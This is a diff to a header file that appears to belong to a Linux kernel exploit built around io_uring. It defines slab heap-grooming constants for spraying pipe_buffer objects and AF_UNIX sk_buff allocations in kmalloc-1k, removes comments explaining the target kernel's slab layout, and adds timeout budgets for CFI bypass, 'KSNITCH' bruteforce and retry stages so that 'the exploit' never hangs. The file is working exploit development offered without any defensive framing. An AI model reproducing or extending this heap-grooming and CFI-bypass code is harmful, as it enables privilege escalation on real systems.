@@ -147,16 +147,6 @@ struct io_uring_params {
 #define KMALLOC_SHIFT_HIGH (PAGE_SHIFT + 1)
 #define KMALLOC_BUCKETS (KMALLOC_SHIFT_HIGH + 1)
 #define KMALLOC_NORMAL_TYPE 0
-/*
- * This kernel has NO per-memcg kmalloc caches: its
- * enum kmalloc_cache_type is { NORMAL=0, RECLAIM=1, DMA=2 }
- * (include/linux/slab.h) even with CONFIG_MEMCG_KMEM=y, and
- * kmalloc_type() ignores __GFP_ACCOUNT. So pipe_buffer arrays
- * (kcalloc GFP_KERNEL_ACCOUNT) land in plain kmalloc-1k, and
- * there is no "kmalloc-cg-*" row to match. KMALLOC_CACHE_TYPES
- * must be 3 — reading a 4th row runs past kmalloc_caches[3][14]
- * into adjacent .data.
- */
 #define KMALLOC_CGROUP_TYPE 2 /* actually KMALLOC_DMA on this kernel */
 #define KMALLOC_PIPE_INDEX 10
 #define KMALLOC_CACHE_TYPES 3
@@ -184,14 +174,6 @@ struct io_uring_params {
 #define PIPE_SLAB_SIZE (PIPE_OBJECT_SIZE * PIPE_OBJS_PER_SLAB)
 #define PIPE_MIN_PARTIAL 5
 #define PIPE_CPU_PARTIAL 2
-/*
- * PIPE_DRAIN is now a count of AF_UNIX sk_buff 1k objects
- * (896B data allocs), not pipes, so it does not consume the
- * pipe_user_pages_soft budget.
- * PIPE_RECLAIM stays pipes: 192 * 16 slots = 3072 <= 16384 pages.
- * 192 = 12 reclaim batches * 16 (one full slab of resizes per
- * released sk_buff page, see prepare_pipe_buffer_page).
- */
 #define PIPE_DRAIN_SLABS 32
 #define PIPE_RECLAIM_SLABS 12
 #define PIPE_PARTIAL_GROUPS \
@@ -205,6 +187,21 @@ struct io_uring_params {
 #define PIPE_DRAIN (PIPE_OBJS_PER_SLAB * PIPE_DRAIN_SLABS)
 #define PIPE_RECLAIM (PIPE_OBJS_PER_SLAB * PIPE_RECLAIM_SLABS)
 #define PIPE_MAX_ATTEMPTS 256
+
+/*
+ * Timeout budget (seconds) for the CFI/pipe route so a wedged or slow
+ * kernel-side operation never hangs the exploit forever.  These bound
+ * the worst case to a few minutes per attempt; the CFI retry loop then
+ * gets a bounded number of fresh attempts instead of stalling.
+ */
+#define KSNITCH_COLLISION_TIMEOUT_MS 60000
+#define KSNITCH_BRUTEFORCE_TIMEOUT_SEC 40
+#define CFI_STAGE_TIMEOUT_SEC 120
+#define PIPE_PREPARE_WAIT_SEC 120
+#define CFI_FOPS_WAIT_SEC 60
+#define ROUTE_TIMEOUT_SEC 600
+#define EXP32_TIMEOUT_MS 40000
+int waitpid_timed(pid_t pid, int timeout_ms, int *status);
 
 #define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
 #define P0_DATA_ALIAS_CONST(image_addr) \
